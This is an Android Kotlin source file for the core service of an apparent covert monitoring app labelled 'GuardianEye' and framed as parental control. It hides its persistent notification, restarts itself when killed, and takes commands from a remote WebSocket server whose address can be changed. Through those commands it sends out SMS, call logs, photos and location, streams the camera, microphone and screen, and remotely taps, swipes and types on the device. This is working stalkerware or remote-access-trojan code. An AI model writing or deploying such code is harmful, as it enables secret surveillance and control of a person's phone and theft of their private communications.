package com.system.service.core

import android.app.*
import android.content.Intent
import android.location.Location
import android.os.*
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import com.system.service.monitors.*
import com.system.service.setup.ShakeDetector
import org.json.JSONArray
import org.json.JSONObject

class CoreService : Service() {

    companion object {
        var instance: CoreService? = null
        var SERVER_URL = "wss://your-app.replit.app/api/ws"
        const val PREFS_NAME     = "config"
        const val KEY_SERVER_URL = "server_url"
        const val KEY_PAIR_CODE  = "pair_code"
        private const val CHANNEL_ID = "device_health"
        private const val NOTIF_ID   = 1
    }

    private var wsManager: WebSocketManager? = null
    private var fusedLocationClient: FusedLocationProviderClient? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var shakeDetector: ShakeDetector? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        acquireWakeLock()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildHiddenNotification())
        // Init all managers
        AppBlockerManager.init(this)
        KeywordDetector.init(this)
        connectServer()
        WatchdogReceiver.schedule(this)
        MonitorWorker.enqueue(this)
        shakeDetector = ShakeDetector(this).also { it.start() }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        wsManager?.disconnect()
        shakeDetector?.stop()
        GeofenceMonitor.stopTracking()
        InternetScheduler.disable()
        releaseWakeLock()
        WatchdogReceiver.schedule(this)
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        WatchdogReceiver.schedule(this)
        try { startForegroundService(Intent(this, CoreService::class.java)) } catch (_: Exception) {}
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "GuardianEye::CoreLock")
                .also { it.setReferenceCounted(false); it.acquire(10 * 60 * 60 * 1000L) }
        } catch (_: Exception) {}
    }

    private fun releaseWakeLock() {
        try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Exception) {}
    }

    private fun connectServer() {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val savedUrl = prefs.getString(KEY_SERVER_URL, null)
        val pairCode = prefs.getString(KEY_PAIR_CODE, "") ?: ""
        if (savedUrl != null) SERVER_URL = savedUrl

        wsManager = WebSocketManager(
            serverUrl      = SERVER_URL,
            pairCode       = pairCode,
            onMessage      = { handleCommand(it) },
            onConnected    = {
                // Drain queued notifications
                NotificationMonitor.drainQueue()
                // Send initial status
                sendData("device_info", JSONObject().apply {
                    put("blocked_apps", JSONArray(AppBlockerManager.getBlockedApps()))
                    put("keywords",     JSONArray(KeywordDetector.getKeywords()))
                })
            },
            onDisconnected = {}
        )
        wsManager?.connect()
    }

    fun reconnect() {
        wsManager?.disconnect()
        connectServer()
    }

    private fun handleCommand(data: JSONObject) {
        try {
            when (data.optString("command")) {

                // ── URL update ─────────────────────────────────────────────────
                "update_url" -> {
                    val newUrl = data.optString("url")
                    val newCode = data.optString("pair_code", "")
                    if (newUrl.startsWith("ws://") || newUrl.startsWith("wss://")) {
                        SERVER_URL = newUrl
                        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                        if (newUrl.isNotEmpty()) prefs.putString(KEY_SERVER_URL, newUrl)
                        if (newCode.isNotEmpty()) prefs.putString(KEY_PAIR_CODE, newCode)
                        prefs.apply()
                        wsManager?.disconnect(); connectServer()
                    }
                }

                // ── App Blocker ────────────────────────────────────────────────
                "set_blocked_apps" -> {
                    val arr = data.optJSONArray("apps") ?: JSONArray()
                    val list = (0 until arr.length()).map { arr.getString(it) }
                    AppBlockerManager.setBlockedApps(list)
                    sendData("blocked_apps_updated", JSONObject().apply {
                        put("count", list.size)
                        put("apps", arr)
                    })
                }

                // ── Screen Time Limits ─────────────────────────────────────────
                "set_time_limit" -> {
                    val pkg = data.optString("package")
                    val mins = data.optInt("minutes", 0)
                    if (pkg.isNotEmpty()) AppBlockerManager.setTimeLimit(pkg, mins)
                    sendData("time_limit_set", JSONObject().apply {
                        put("package", pkg); put("minutes", mins)
                    })
                }

                // ── Geofence ───────────────────────────────────────────────────
                "set_geofence" -> {
                    val lat    = data.optDouble("lat")
                    val lng    = data.optDouble("lng")
                    val radius = data.optDouble("radius", 200.0).toFloat()
                    GeofenceMonitor.setGeofence(lat, lng, radius, this)
                    sendData("geofence_set", JSONObject().apply {
                        put("lat", lat); put("lng", lng); put("radius", radius)
                    })
                }
                "disable_geofence" -> { GeofenceMonitor.disableGeofence() }

                // ── Keyword Alerts ─────────────────────────────────────────────
                "set_keywords" -> {
                    val arr = data.optJSONArray("keywords") ?: JSONArray()
                    val list = (0 until arr.length()).map { arr.getString(it) }
                    KeywordDetector.setKeywords(list, this)
                    sendData("keywords_updated", JSONObject().apply { put("count", list.size) })
                }

                // ── Internet Schedule ──────────────────────────────────────────
                "set_schedule" -> {
                    val offStart = data.optInt("off_hour_start", 23)
                    val offEnd   = data.optInt("off_hour_end", 6)
                    InternetScheduler.setSchedule(offStart, offEnd, this)
                    sendData("schedule_set", JSONObject().apply {
                        put("off_start", offStart); put("off_end", offEnd)
                    })
                }
                "disable_schedule" -> { InternetScheduler.disable() }

                // ── Daily Report ───────────────────────────────────────────────
                "get_daily_report" -> {
                    sendData("daily_report", AppBlockerManager.getDailyReport())
                }

                // ── Contact Blocker ────────────────────────────────────────────
                "block_contact" -> {
                    val number = data.optString("number")
                    // Store in prefs — call/SMS intercept in future (needs device owner)
                    val prefs = getSharedPreferences("blocked_contacts", MODE_PRIVATE)
                    val existing = prefs.getStringSet("numbers", mutableSetOf()) ?: mutableSetOf()
                    existing.add(number)
                    prefs.edit().putStringSet("numbers", existing).apply()
                    sendData("contact_blocked", JSONObject().apply { put("number", number) })
                }

                // ── Basic commands ─────────────────────────────────────────────
                "lock_screen"       -> lockScreen()
                "get_battery"       -> sendBattery()
                "get_location"      -> sendLocation()
                "take_photo"        -> takeSinglePhoto()
                "emergency_lock"    -> { lockScreen(); sendData("emergency_locked", JSONObject()) }

                "wifi_on"  -> runShellCmd("svc wifi enable")
                "wifi_off" -> runShellCmd("svc wifi disable")

                "get_gallery"     -> sendGallery(data.optInt("limit", 20))
                "get_full_photo"  -> sendFullPhoto(data.optString("path"))
                "get_call_log"    -> sendCallLog(data.optInt("limit", 50))
                "get_sms"         -> sendSms(data.optInt("limit", 50))
                "get_running_app" -> sendCurrentApp()
                "get_app_usage"   -> sendAppUsage(data.optInt("hours", 24))

                "start_camera_stream" -> startService(
                    Intent(this, CameraStreamService::class.java)
                        .putExtra("interval", data.optLong("interval", 2000L)))
                "stop_camera_stream"  -> startService(
                    Intent(this, CameraStreamService::class.java).setAction("STOP"))

                "start_mic_stream" -> startService(Intent(this, AudioStreamService::class.java))
                "stop_mic_stream"  -> startService(
                    Intent(this, AudioStreamService::class.java).setAction("STOP"))

                "start_screen_stream" -> startService(
                    Intent(this, ScreenStreamService::class.java)
                        .putExtra("interval", data.optLong("interval", 1000L)))
                "stop_screen_stream"  -> startService(
                    Intent(this, ScreenStreamService::class.java).setAction("STOP"))

                "touch"   -> AccessibilityMonitor.performTouch(
                    data.optDouble("x", 0.0).toFloat(), data.optDouble("y", 0.0).toFloat())
                "swipe"   -> AccessibilityMonitor.performSwipe(
                    data.optDouble("x1", 0.0).toFloat(), data.optDouble("y1", 0.0).toFloat(),
                    data.optDouble("x2", 0.0).toFloat(), data.optDouble("y2", 500.0).toFloat(),
                    data.optLong("duration", 300))
                "key_back"    -> AccessibilityMonitor.performBack()
                "key_home"    -> AccessibilityMonitor.performHome()
                "key_recents" -> AccessibilityMonitor.performRecents()
                "type_text"   -> AccessibilityMonitor.typeText(data.optString("text"))

                "grant_permissions" -> {
                    val count = ShizukuManager.grantAllPermissions(this)
                    sendData("permissions_result", JSONObject().apply {
                        put("granted", count)
                        put("shizuku_available", ShizukuManager.isShizukuAvailable())
                    })
                }
            }
        } catch (_: Exception) {}
    }

    fun sendData(type: String, data: JSONObject) {
        try {
            data.put("type", type)
            data.put("ts", System.currentTimeMillis())
            wsManager?.send(data)
        } catch (_: Exception) {}
    }

    private fun lockScreen() {
        try {
            (getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager).lockNow()
        } catch (_: Exception) {}
    }

    private fun runShellCmd(cmd: String) {
        try { Runtime.getRuntime().exec(cmd.split(" ").toTypedArray()).waitFor() } catch (_: Exception) {}
    }

    private fun sendBattery() {
        try {
            val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
            sendData("battery", JSONObject().apply {
                put("battery", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY))
                put("charging", bm.isCharging)
            })
        } catch (_: Exception) {}
    }

    private fun sendLocation() {
        try {
            fusedLocationClient?.lastLocation?.addOnSuccessListener { loc: Location? ->
                loc?.let {
                    sendData("location", JSONObject().apply {
                        put("lat", it.latitude); put("lng", it.longitude)
                        put("accuracy", it.accuracy)
                    })
                }
            }
        } catch (_: Exception) {}
    }

    private fun sendGallery(limit: Int) {
        try { sendData("gallery", JSONObject().apply {
            put("photos", GalleryManager.getRecentPhotos(this@CoreService, limit)) }) }
        catch (_: Exception) {}
    }

    private fun sendFullPhoto(path: String) {
        try {
            val b64 = GalleryManager.getFullPhoto(this, path) ?: return
            sendData("full_photo", JSONObject().apply { put("image", b64); put("path", path) })
        } catch (_: Exception) {}
    }

    private fun sendCallLog(limit: Int) {
        try { sendData("call_log", JSONObject().apply {
            put("calls", CallLogManager.getCallLog(this@CoreService, limit)) }) }
        catch (_: Exception) {}
    }

    private fun sendSms(limit: Int) {
        try { sendData("sms", JSONObject().apply {
            put("messages", SmsReader.getSms(this@CoreService, limit)) }) }
        catch (_: Exception) {}
    }

    private fun sendCurrentApp() {
        try {
            val pkg = AppUsageManager.getCurrentApp(this)
            sendData("current_app", JSONObject().apply { put("package", pkg ?: "") })
        } catch (_: Exception) {}
    }

    private fun sendAppUsage(hours: Int) {
        try { sendData("app_usage", JSONObject().apply {
            put("stats", AppUsageManager.getUsageStats(this@CoreService, hours)) }) }
        catch (_: Exception) {}
    }

    private fun takeSinglePhoto() {
        try { startService(Intent(this, CameraStreamService::class.java)
            .putExtra("interval", 99999999L)) } catch (_: Exception) {}
    }

    private fun createNotificationChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "Background Services",
            NotificationManager.IMPORTANCE_NONE).apply {
            setShowBadge(false); enableLights(false); enableVibration(false)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
        }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildHiddenNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("").setContentText("")
            .setSmallIcon(android.R.drawable.screen_background_dark)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false).setSilent(true).build()

    override fun onStartCommand(intent: Intent?, flags: Int, id: Int) = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
}
